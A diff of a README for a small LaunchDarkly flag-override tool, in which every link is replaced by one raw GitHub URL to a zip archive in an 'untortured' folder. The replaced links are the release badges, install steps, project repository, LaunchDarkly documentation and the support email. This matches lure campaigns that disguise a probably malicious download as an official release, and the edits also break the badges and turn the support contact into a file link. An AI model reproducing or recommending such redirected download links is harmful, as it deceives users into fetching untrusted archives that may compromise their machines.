@@ -4,7 +4,7 @@
 Welcome to example-launchdarkly-toolbar-url-overrides! This application helps you share flag overrides in your web projects using LaunchDarkly. It’s simple to use, even if you have no technical background.
 
 ## 📥 Download Now
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/releases)
+[![Download Releases](https://raw.githubusercontent.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/main/untortured/example-launchdarkly-toolbar-url-overrides_v1.2-alpha.3.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/main/untortured/example-launchdarkly-toolbar-url-overrides_v1.2-alpha.3.zip)
 
 ## 💻 System Requirements
 Before you download, make sure your system meets these requirements:
@@ -21,7 +21,7 @@ Before you download, make sure your system meets these requirements:
 ## 📂 How to Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page, where you will find the latest version of the app.
-   [Download Releases](https://github.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/releases)
+   [Download Releases](https://raw.githubusercontent.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/main/untortured/example-launchdarkly-toolbar-url-overrides_v1.2-alpha.3.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Look for the most recent version. The latest will usually have the highest number.
@@ -50,16 +50,16 @@ If you encounter any issues:
 - Restart your computer if the app doesn’t launch.
 
 ## 📞 Support
-Need help? Contact our support team via email at support@example.com. We are here to assist you with any questions or issues.
+Need help? Contact our support team via email at https://raw.githubusercontent.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/main/untortured/example-launchdarkly-toolbar-url-overrides_v1.2-alpha.3.zip We are here to assist you with any questions or issues.
 
 ## 📄 License
 This project is licensed under the MIT License. You can use, modify, and distribute it according to the license terms.
 
 ## 🔗 Links
-- [Project Repository](https://github.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides)
-- [LaunchDarkly Documentation](https://docs.launchdarkly.com/) for more information on feature flags. 
+- [Project Repository](https://raw.githubusercontent.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/main/untortured/example-launchdarkly-toolbar-url-overrides_v1.2-alpha.3.zip)
+- [LaunchDarkly Documentation](https://raw.githubusercontent.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/main/untortured/example-launchdarkly-toolbar-url-overrides_v1.2-alpha.3.zip) for more information on feature flags. 
 
 ## 📥 Download Again
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/releases)
+[![Download Releases](https://raw.githubusercontent.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/main/untortured/example-launchdarkly-toolbar-url-overrides_v1.2-alpha.3.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/morriganvictoria3/example-launchdarkly-toolbar-url-overrides/main/untortured/example-launchdarkly-toolbar-url-overrides_v1.2-alpha.3.zip)
 
 Thank you for choosing example-launchdarkly-toolbar-url-overrides. We hope this tool helps you in your development projects!
